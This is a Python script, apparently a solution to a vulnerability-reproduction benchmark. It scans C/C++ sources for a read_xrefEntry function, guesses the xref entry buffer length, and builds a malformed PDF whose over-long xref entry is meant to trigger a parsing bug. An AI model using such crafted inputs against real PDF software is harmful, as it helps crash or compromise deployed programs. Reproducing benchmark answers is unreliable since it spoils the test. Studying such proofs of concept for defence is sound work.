import os
import re
import tarfile
from typing import Iterable, List, Tuple, Optional


class Solution:
    def _iter_source_texts(self, src_path: str) -> Iterable[Tuple[str, str]]:
        exts = (".cc", ".cpp", ".cxx", ".c", ".h", ".hpp", ".hh")
        max_file = 2_000_000
        max_total = 40_000_000
        total = 0

        def read_bytes_limited(f, limit: int) -> bytes:
            return f.read(limit)

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    lfn = fn.lower()
                    if not lfn.endswith(exts):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        sz = os.path.getsize(p)
                    except OSError:
                        continue
                    if sz <= 0:
                        continue
                    to_read = min(sz, max_file)
                    if total + to_read > max_total:
                        return
                    try:
                        with open(p, "rb") as f:
                            data = read_bytes_limited(f, to_read)
                    except OSError:
                        continue
                    total += to_read
                    try:
                        yield (p, data.decode("utf-8", "ignore"))
                    except Exception:
                        continue
            return

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    lname = name.lower()
                    if not lname.endswith(exts):
                        continue
                    if m.size <= 0:
                        continue
                    to_read = min(m.size, max_file)
                    if total + to_read > max_total:
                        return
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = read_bytes_limited(f, to_read)
                    except Exception:
                        continue
                    total += to_read
                    try:
                        yield (name, data.decode("utf-8", "ignore"))
                    except Exception:
                        continue
        except Exception:
            return

    def _detect_xref_entry_fixed_len(self, sources: Iterable[Tuple[str, str]]) -> int:
        # Default for PDF xref table entries is 20 bytes (excluding EOL).
        default_n = 20

        func_pat = re.compile(r"\bread_xrefEntry\b")
        char_arr_pat = re.compile(r"\bchar\s+\w+\s*\[\s*(\d{1,4})\s*\]")
        read_call_pat = re.compile(r"\bread\s*\(\s*[^,;\n]+,\s*(\d{1,4})\s*\)")
        fread_like_pat = re.compile(r"\b(?:fread|read_bytes|readBytes|read\w*)\s*\(\s*[^,;\n]+,\s*(\d{1,4})\s*\)")

        candidates: List[int] = []
        for _, text in sources:
            m = func_pat.search(text)
            if not m:
                continue
            start = m.start()
            window = text[start:start + 12000]

            for a in char_arr_pat.findall(window):
                try:
                    s = int(a)
                except ValueError:
                    continue
                if 12 <= s <= 128:
                    candidates.append(s - 1)

            for a in read_call_pat.findall(window):
                try:
                    n = int(a)
                except ValueError:
                    continue
                if 8 <= n <= 128:
                    candidates.append(n)

            for a in fread_like_pat.findall(window):
                try:
                    n = int(a)
                except ValueError:
                    continue
                if 8 <= n <= 128:
                    candidates.append(n)

            break

        # Choose the most plausible value near 20.
        if not candidates:
            return default_n

        # Prefer 20 if present, else nearest to 20 within a sensible range.
        if 20 in candidates:
            return 20

        best = None
        best_dist = 10**9
        for n in candidates:
            if not (8 <= n <= 64):
                continue
            d = abs(n - 20)
            if d < best_dist:
                best_dist = d
                best = n
        return best if best is not None else default_n

    def solve(self, src_path: str) -> bytes:
        sources = list(self._iter_source_texts(src_path))
        n = self._detect_xref_entry_fixed_len(sources)

        header = b"%PDF-1.0\n"
        xref = b"xref\n0 1\n"
        # Make the "first end-of-line character" be '0' by ensuring the entry line is longer than expected.
        entry = (b"0" * (n + 1)) + b"\n"
        startxref = b"startxref\n" + str(len(header)).encode("ascii") + b"\n%%EOF\n"
        return header + xref + entry + startxref